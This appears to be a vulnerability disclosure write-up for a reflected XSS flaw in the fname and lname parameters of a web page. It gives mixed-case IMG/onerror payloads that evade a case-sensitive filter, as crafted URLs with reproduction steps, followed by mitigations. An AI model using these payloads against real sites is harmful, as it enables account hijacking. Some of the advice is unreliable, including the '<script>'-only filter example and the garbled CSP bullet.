# Reflected Cross-Site Scripting (XSS) - Case-Insensitive Filter Evasion

## Summary

I identified a Reflected Cross-Site Scripting (XSS) vulnerability in the `fname` and `lname` parameters of the application.

The application attempts to filter or sanitize user input but can be bypassed using case-insensitive variations of HTML tags and event handlers. By injecting malicious payloads with mixed-case or alternative case formatting, arbitrary code execution is achieved despite case-sensitive filtering mechanisms.

An attacker can craft a malicious URL and trick a victim into clicking it. Once the victim visits the page, the injected JavaScript executes in the context of the vulnerable application, triggering `confirm(1)` and `confirm(2)` popups.

## Vulnerability Type

**Cross-Site Scripting (XSS) - Reflected**

## Vulnerable Parameters

```text
fname
lname
```

## Vulnerable URL

```text
https://kzlabs.in/4.php?fname='>anil<IMG SrC=x ONeRRoR=confirm(1)>&lname='>anil<IMG SrC=x ONeRRoR=confirm(2)>
```

## Steps to Reproduce

1. Open the vulnerable page.

2. Replace the values of the `fname` and `lname` parameters with the following payloads:

   ```text
   fname='>anil<IMG SrC=x ONeRRoR=confirm(1)>
   lname='>anil<IMG SrC=x ONeRRoR=confirm(2)>
   ```

3. Visit the crafted URL:

   ```text
   https://kzlabs.in/4.php?fname=%27%3Eanil%3CIMG+SrC%3Dx+ONeRRoR%3Dconfirm%281%29%3E&lname=%27%3Eanil%3CIMG+SrC%3Dx+ONeRRoR%3Dconfirm%282%29%3E
   ```

4. Observe that the browser executes the injected payload and displays `confirm(1)` and `confirm(2)` popups.

5. Note that the values are also reflected in the input fields, confirming the vulnerability.

## Payloads Used

```text
fname: '>anil<IMG SrC=x ONeRRoR=confirm(1)>
lname: '>anil<IMG SrC=x ONeRRoR=confirm(2)>
```

URL-encoded versions:
```text
fname: %27%3Eanil%3CIMG+SrC%3Dx+ONeRRoR%3Dconfirm%281%29%3E
lname: %27%3Eanil%3CIMG+SrC%3Dx+ONeRRoR%3Dconfirm%282%29%3E
```

Alternative payload observed:
```text
%27%22%3Eanil%3CIMG+SrC%3Dx+ONeRRoR%3Dconfirm%281%29%3E
```

## Proof of Concept

The application accepts the values of the `fname` and `lname` parameters and reflects them directly into the page HTML. While case-sensitive filtering may exist, the payload uses mixed-case formatting (`IMG`, `SrC`, `ONeRRoR`) to evade detection.

The payload works by:
1. Breaking out of the existing HTML context using `'>` or `'">`
2. Injecting an `<IMG>` tag with mixed-case attributes to bypass case-sensitive filters
3. The `ONeRRoR` event (mixed-case variation of `onerror`) triggers when the image fails to load (due to `SrC=x`, where `x` is an invalid source)
4. This executes the JavaScript `confirm(1)` and `confirm(2)`

```html
<!-- Injected payload rendered in the page: -->
'><img src="x" onerror="confirm(1)">
'><img src="x" onerror="confirm(2)">
```

HTML is case-insensitive, so `<IMG>`, `<ImG>`, `<img>`, etc., all work the same way. This technique effectively bypasses case-sensitive blacklist filters.

<img width="1919" height="944" alt="Screenshot 2026-08-14 174221" src="https://github.com/user-attachments/assets/5ce104f1-45aa-4aa1-83d1-82816c1b172b" />


<img width="1919" height="889" alt="Screenshot 2026-08-14 174324" src="https://github.com/user-attachments/assets/404ac22f-ddca-4635-816d-e2823af575cd" />


## Impact

An attacker can craft a malicious link that, when opened by a victim, executes arbitrary JavaScript in the context of the vulnerable website. This could allow an attacker to:

- Steal session cookies and hijack user accounts
- Perform actions on behalf of the authenticated user
- Deface the webpage or manipulate its content
- Redirect users to malicious websites
- Capture keystrokes or sensitive information entered by the user
- Bypass case-sensitive filtering mechanisms

## Recommendation

To mitigate this vulnerability:

- **Output Encoding**: Use `htmlspecialchars()` (or an equivalent output-encoding function) before rendering user-controlled data in HTML to convert special characters to their HTML entities.
  ```php
  echo htmlspecialchars($_GET['fname'], ENT_QUOTES, 'UTF-8');
  ```

- **Case-Insensitive Filtering**: If implementing input filtering, ensure it is case-insensitive by converting all input to lowercase or using case-insensitive pattern matching.
  ```php
  $input = strtolower($_GET['fname']);
  if (strpos($input, '<script>') !== false) {
      // Block or sanitize
  }
  ```

- **Input Validation**: Validate and sanitize all user inputs. Consider using a whitelist approach to allow only safe characters.

- **Content Security Policy (CSP)**: Implement a strict CSP that restricts inline scripts and event handlers using `unsafe-inline` and `unsafe-eval` directives.

- **Context-Aware Escaping**: Use context-aware escaping based on where the data is placed (HTML body, attributes, JavaScript, etc.).

- **Web Application Firewall (WAF)**: Deploy a WAF, such as Cloudflare WAF, to help detect and block malicious XSS payloads.

- **Security Headers**: Implement security headers like `X-XSS-Protection` and `X-Content-Type-Options` for additional protection.

- **HTML Sanitization**: Use a robust HTML sanitization library (like DOMPurify or HTML Purifier) to strip dangerous tags and attributes regardless of case.

---
